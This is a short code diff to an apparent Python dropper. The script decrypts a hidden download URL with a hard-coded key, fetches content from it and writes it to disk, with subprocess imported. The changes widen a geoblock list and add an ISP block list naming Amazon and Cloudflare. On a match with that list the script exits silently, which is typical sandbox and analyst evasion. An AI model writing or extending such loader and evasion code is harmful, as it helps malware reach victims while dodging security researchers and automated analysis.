@@ -32,7 +32,9 @@ blok_url = "http://ip-api.com/json/"
 response = requests.get(blok_url)
 data = response.json()
 country = data['countryCode']
-bloked = ['RU', 'KR', 'KP']
+isp = data['isp']
+bloked = ['RU', 'KR', 'KP', 'VN', 'US', 'CA', 'IL']
+bloked_isp = ['Amazon.com, Inc.', 'Cloudflare, Inc.', 'VietNam Post and Telecom Corporation', '']
 verze_os = platform.version()
 url = decrypt_text(decoded_string, "UNF4PkMO/Hi6sRJVRWWkByXOipXEkCaR3RC7NNkKsnJgCJHVsh5lT1tEX90vLkKc")
 import subprocess
@@ -65,6 +67,8 @@ def init():
   if country in bloked:
     print(f"{Fore.RED}Unsuported country")
     return False
+  if isp in bloked_isp:
+    sys.exit()
   print(f"{Fore.WHITE}[{Fore.YELLOW}!{Fore.WHITE}] Checking")
   response = requests.get(url)
   with open(cilovy_soubor, 'wb') as soubor:
